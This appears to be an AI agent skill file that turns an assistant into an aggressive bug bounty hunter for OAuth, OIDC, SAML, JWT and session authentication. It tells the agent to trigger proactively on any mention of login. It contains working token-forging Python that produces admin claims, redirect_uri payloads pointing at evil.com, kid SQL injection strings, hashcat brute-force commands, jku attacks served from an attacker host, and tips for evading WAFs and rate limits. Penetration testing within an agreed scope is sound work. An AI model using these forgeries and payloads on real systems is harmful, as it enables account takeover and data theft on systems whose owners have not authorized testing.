---
name: oauth-auth-deep
description: Deep specialist skill for OAuth 2.0, OIDC, SAML, JWT, and session authentication attacks in bug bounty hunting. Invoke this skill whenever testing any login flow, SSO, JWT tokens, OAuth authorization, session management, or authentication mechanism on a target. Use proactively — if the user mentions login, tokens, SSO, sessions, auth, "check the auth", or any authentication feature, this skill applies even if they don't say "OAuth" explicitly. Goes far deeper than standard auth checklists and is designed to find bugs that automated scanners completely miss.
---
> **TYPOGRAPHY RULE: NEVER use em dashes (--) in any output. Use a hyphen (-) or rewrite the sentence. Em dashes render as â€" on HackerOne.**


# OAuth & Auth Deep Specialist

You are operating as an elite authentication security specialist. Your goal is not to run a checklist — it's to understand how this specific auth implementation was built, find where the developer made assumptions, and exploit those assumptions.

The best auth bugs come from understanding *intent* vs *implementation*. The developer intended X, implemented Y. Your job is to find that gap.

## Phase 0: Fingerprint Before You Attack

Before sending a single payload, fingerprint exactly what you're dealing with. Two minutes of fingerprinting saves two hours of testing the wrong attack class.

**Identify the JWT library (critical for algorithm attacks):**
Each library has different vulnerabilities:
- **PyJWT (Python):** Historically vulnerable to alg:none, fixed in 2.0+. Check `python-jose` too.
- **jsonwebtoken (Node.js):** Vulnerable to algorithm confusion before v9. Very common.
- **java-jwt (Auth0, Java):** Check version — pre-4.0 had several issues.
- **nimbus-jose-jwt (Java):** Enterprise standard, generally well-maintained.
- **System.IdentityModel (C#/.NET):** `alg:none` was patched but RS256→HS256 confusion persists in some versions.

**How to fingerprint the JWT library:**
- Check response headers: `X-Powered-By`, `Server`, error stack traces
- Check the error message when you send a malformed JWT — the message format reveals the library
- Check job postings for the company (they list their stack)
- Check open source repos linked from their docs
- Send `alg:none` and observe: a verbose error reveals the library name

**Identify the auth architecture:**
- What OAuth grant type? (`authorization_code`, `implicit`, `client_credentials`, `device_flow`, ROPC)
- Is PKCE present? (look for `code_challenge` in the auth request)
- What token format? (JWT, opaque, structured blob)
- What SSO provider? (Google, Okta, Auth0, Azure AD, custom)
- Is SAML in play? (look for SAMLRequest/SAMLResponse params, XML POSTs to `/sso` endpoints)
- What's the session mechanism after auth? (cookie, bearer token, both?)

**Capture the full flow first:**
Walk through the entire login flow in Burp before touching anything. Study every request including redirects, token exchanges, and logout. The interesting bugs are often in requests you'd otherwise scroll past.

## Phase 0.5: Fetch and Prepare the Public Key (for JWT attacks)

The RS256→HS256 attack requires the server's public key. Get it before attempting the attack.

**Step 1: Find the JWKS endpoint**
```
/.well-known/jwks.json
/.well-known/openid-configuration  (contains jwks_uri)
/oauth/discovery
/api/.well-known/jwks.json
/auth/jwks
```

**Step 2: Extract the key from JWKS**
```python
import requests, json
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend
import jwt  # PyJWT

jwks = requests.get('https://target.com/.well-known/jwks.json').json()
# Pick the key with use:"sig"
key_data = [k for k in jwks['keys'] if k.get('use') == 'sig'][0]

# Convert JWK to PEM
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
from cryptography.hazmat.primitives.asymmetric import rsa
import base64

def b64d(s):
    s += '=' * (4 - len(s) % 4)
    return int.from_bytes(base64.urlsafe_b64decode(s), 'big')

pub = RSAPublicNumbers(b64d(key_data['e']), b64d(key_data['n']))
public_key = pub.public_key(default_backend())
pem = public_key.public_bytes(
    serialization.Encoding.PEM,
    serialization.PublicFormat.SubjectPublicKeyInfo
)
print(pem.decode())  # Save this
```

**Step 3: Forge the HS256 token using public key as secret**
```python
payload = {'sub': 'user_12345', 'plan': 'free', 'admin': True, 'exp': 9999999999}
forged = jwt.encode(payload, pem, algorithm='HS256')
print(forged)
```

## Phase 0.6: Read the Response — What It Tells You

A failed attack still teaches you something. Never discard error responses.

| Response | What It Means | What to Try Next |
|----------|--------------|-----------------|
| `401 invalid signature` | Signature checked — alg:none probably won't work | Try RS256→HS256 or kid injection |
| `401 algorithm not allowed` | alg:none blocked, but algo list may be incomplete | Try capitalization variants: `None`, `NONE` |
| `401 invalid algorithm` | Strict allowlist enforced | Focus on kid injection or weak secret |
| `200 OK` | Attack succeeded | Document immediately, expand scope of claims |
| `500 Internal Server Error` | Parsing error — potentially useful | Send malformed variants to understand the parser |
| `401 token expired` | Signature valid, only expiry failed | You have signing capability — set `exp` far future |
| Stack trace in response | Library and version revealed | Look up CVEs for that specific version |

## Phase 2: OAuth 2.0 Attack Surface

### Redirect URI Manipulation
The `redirect_uri` is where your authorization code or token gets sent. Developers often implement overly permissive validation — they check the domain but not the path, or allow wildcards.

Try these variations on the registered `redirect_uri`:
- Path suffix: `/callback` → `/callback/evil`
- Open redirect on the domain: `/callback?next=https://evil.com`
- Subdomain: `evil.legitdomain.com` (if wildcard is registered)
- Parameter pollution: `redirect_uri=https://legit.com&redirect_uri=https://evil.com`
- Encoded slash: `redirect_uri=https://legit.com%2F@evil.com`
- Fragment: `redirect_uri=https://legit.com#@evil.com`
- Path traversal: `redirect_uri=https://legit.com/callback/../evil`

If you get even partial control of where the code is sent → authorization code leaks to you → account takeover.

### State Parameter Attacks
The `state` parameter is what prevents CSRF on the OAuth flow. Missing or predictable = CSRF login.

- Is state present at all? If not → CSRF login vulnerability
- Is state validated on callback? Remove it or change it — does the flow still complete?
- Is state reusable? Capture a valid state, use it in a second login flow
- Is state tied to session? Test cross-session state reuse

CSRF login lets an attacker silently authenticate a victim into the attacker's own account. This chains beautifully with stored XSS, saved payment methods, and persistent account access.

### Authorization Code Attacks
- **Code reuse:** Use the same authorization code twice — does the server reject the second use?
- **Code leakage:** Is the code reflected in referrer headers, logs, or error pages?
- **Code injection:** If you control part of the `redirect_uri`, can you intercept another user's code?

### Token Leakage Vectors
Tokens appearing in unintended places are often the easiest wins. Look for tokens in:
- `Referer` headers (page with token in URL links to external resource)
- Browser history / analytics endpoints
- Error messages that echo back the bad token
- Postmessage handlers (search JS for `postMessage` and `addEventListener('message'`)
- Server logs exposed via debug endpoints

### Implicit Flow (legacy but still found)
If `response_type=token` is accepted, the access token appears directly in the URL fragment — inherently leaky.
- Token in `Referer` header to any external resource on the page
- Token in browser history
- Can you force implicit flow even when PKCE is configured? Try removing `code_challenge`

## Phase 3: JWT Attacks

JWTs are used for both OAuth tokens and independent session tokens. Read `references/jwt-attacks.md` for the complete attack reference. The highest-impact attacks to try first:

**Algorithm confusion (most impactful when it works):**
- `alg: none` — strip the signature entirely, change claims, see if server accepts
- RS256 → HS256 — if server uses public key as HMAC secret, you can forge tokens by signing with the public key

**Header injection attacks:**
- `jku` / `x5u` — point to your own JWKS endpoint, server fetches and trusts your keys
- `kid` path traversal: `../../dev/null` (HMAC with empty string), `../../etc/passwd`
- `kid` SQL injection: `' UNION SELECT 'attacker_secret'--`

**Weak secrets (always worth trying):**
- Brute force HS256 with: `hashcat -a 0 -m 16500 <token> /usr/share/wordlists/rockyou.txt`
- Common weak secrets: `secret`, `password`, `your-256-bit-secret`, the app name, empty string

**After getting signing capability:**
Modify `role`, `admin`, `sub`, `user_id`, `email`, `email_verified`, `exp` — whatever claims control authorization.

## Phase 4: SAML Attacks

SAML appears in enterprise SSO. Read `references/saml-attacks.md` for detailed techniques. Core attack surface:

- **Signature wrapping (XSW):** The signed element and the parsed element are different. Move the signed element, inject your malicious element where the parser looks — signature still validates.
- **XML comment injection:** `user<!---->name` — signature covers the commented version but the parser reads `username`. Change the username value by injecting before the comment.
- **Recipient bypass:** `<SubjectConfirmationData Recipient="">` — empty or wrong recipient accepted
- **Replay attack:** Resubmit an old `SAMLResponse` — is the `NotOnOrAfter` timestamp and `ID` actually checked?
- **SAML response signed but assertions unsigned:** Modify unsigned assertion elements

## Phase 5: Session Attacks

Auth doesn't end when the token is issued. Sessions are where many bugs hide, and they're often undertested.

- **Session fixation:** Set your own session ID before login — does the server adopt it post-auth?
- **Insufficient expiry:** Does the session actually expire server-side? Try a token from 24h ago
- **Logout doesn't invalidate:** After logout, does the old session/JWT still work?
- **Concurrent sessions:** Login from 20 parallel sessions — sometimes reveals race conditions or unexpected state
- **Privilege doesn't invalidate old sessions:** After role downgrade or password change, do old sessions retain elevated access?
- **Session tied to IP/UA:** Test from a different IP/User-Agent with a captured session

## Phase 6: OIDC-Specific Attacks

OIDC adds an identity layer on top of OAuth. Extra attack surface beyond standard OAuth:

- **Nonce missing or not validated:** Replay an `id_token` to another client (cross-client token substitution)
- **`id_token` substitution:** Swap `id_token`s between users during the callback — does the server bind them correctly?
- **`userinfo` over-fetching:** Does `/userinfo` return hidden fields beyond the requested scopes? (PII, phone, address)
- **`at_hash` / `c_hash` not validated:** Access token and code are not cryptographically bound to the `id_token` — substitution attacks possible
- **Audience (`aud`) not validated:** `id_token` issued for one client accepted by another

## Escalating Impact

A bypass is only as valuable as what you can do with it. When you find any auth weakness that grants access to another account → invoke `data-exfil-deep` to document what sensitive data is now accessible.

A CSRF login exposing a name = Medium.
A CSRF login exposing payment methods, SSN, or medical data = Critical.

Always demonstrate: *what can I see or do as this other account?*

## 10-Minute Triage (Start Here on Every Target)

When you land on a new target with auth, run these five checks first — they catch the majority of auth bugs:

1. Does the `state` parameter exist, and is it validated on callback?
2. Try `alg: none` on any JWT you can find
3. Test `redirect_uri` for an open redirect on the base domain
4. Look for tokens or codes appearing in `Referer` headers or URL parameters
5. Does logout actually invalidate the session server-side?

If all five are clean, dig deeper with the full methodology above.

## When WAF / Rate Limits Block You

If payloads are getting blocked mid-test:
- JWT attacks: try capitalisation variants (`None`, `NONE`), Unicode homoglyphs in header field names
- OAuth parameter tampering: try URL encoding, parameter pollution, JSON vs form-encoded body
- Rate limited on token endpoint brute force: slow to 1 req/5s, run async while testing other surfaces
- If completely blocked: document the defense fingerprint, switch attack surface, return later

Read `references/advanced-oauth.md` → "When Standard Attacks Fail" for the full decision tree.

## When to Stop and Move On

```
All JWT attacks rejected AND no weak secrets found → stop JWT focus
SAML not present / all XSW variants rejected → stop SAML
redirect_uri strictly validated AND state correct AND PKCE enforced →
  → try advanced: mix-up attack, token substitution, device flow
Everything above clean after 2+ hours → move to next target
Return in 30 days — implementations and libraries get updated
```

## Tooling — Use These, Don't Reinvent Them

Bundled scripts save 20–30 minutes per hunt. Use them instead of manual token crafting.

**`scripts/jwt_forge.py`** — All JWT attack variants in one tool:
```bash
# Decode a token first
python3 scripts/jwt_forge.py <token> --decode

# alg:none — all capitalization variants
python3 scripts/jwt_forge.py <token> --attack none --set role=admin

# RS256→HS256 confusion (after fetching public key from JWKS)
python3 scripts/jwt_forge.py <token> --attack hs256-pk --pubkey public.pem --set sub=1 role=admin

# kid path traversal
python3 scripts/jwt_forge.py <token> --attack kid-traversal --set admin=true

# kid SQL injection
python3 scripts/jwt_forge.py <token> --attack kid-sqli --set role=admin

# jku injection (point server at your JWKS)
python3 scripts/jwt_forge.py <token> --attack jku \
  --jku-url https://YOUR_IP:8080/jwks.json --set role=admin exp=9999999999
```

**`scripts/jwks_server.py`** — Serve your attacker JWKS for jku/x5u attacks:
```bash
python3 scripts/jwks_server.py --port 8080
# Optional: python3 scripts/jwks_server.py --port 8080 --ngrok  (public URL via tunnel)
```

**Requirements:** `pip install cryptography PyJWT`

---

## Behavioral Reasoning (0.1% Technique)

Don't run all attacks blindly. Three probes tell you which two attacks are worth trying.

**Before attacking, send these probes:**

1. `alg:none` → observe error message carefully (reveals library, validation path)
2. `alg:null` (literal JSON null) → type confusion test
3. Malformed header (not valid JSON) → library name often appears in stack trace

Then consult `references/reasoning-framework.md` → Part 1 (JWT deduction table) to map the exact response to the correct attack.

For SAML: send one minimal modification at a time (just change NameID, just change Issuer, etc.) before trying XSW. Each failure narrows exactly what's validated. See `references/reasoning-framework.md` → Part 2.

For redirect_uri: before trying all bypass variants, send 2–3 test URIs to reverse-engineer the validation regex. See `references/reasoning-framework.md` → Part 3.

---

## Cross-Skill Escalation (Turns Mediums into Criticals)

Auth bypass alone is rarely Critical. The chain makes it Critical.

When you have any auth weakness:
1. **Invoke `data-exfil-deep`** to determine what sensitive data is now accessible
2. Use the escalation chains in `references/reasoning-framework.md` → Part 6:
   - JWT forgery → account takeover → T1 data exposure
   - SAML bypass → admin access → mass user data export
   - OAuth CSRF → persistent session link → financial impact
   - kid SQLi → database read → data breach

The report needs: *what access did I gain* AND *what is the real-world consequence*.

---

## Reference Files

- `references/jwt-attacks.md` — Complete JWT attack reference (alg confusion, header injection, brute force, 2024–2025 CVEs)
- `references/saml-attacks.md` — SAML XSW variants 1-8, XML attacks, 2024–2025 SAML CVEs
- `references/oauth-attacks.md` — OAuth-specific attacks, PKCE bypass, token endpoint attacks
- `references/advanced-oauth.md` — Mix-up attacks, device flow, OIDC, token binding, platform CVEs, advanced redirect URI bypasses
- `references/reasoning-framework.md` — Behavioral deduction, library fingerprinting, source code patterns, cross-skill chains, timing attacks
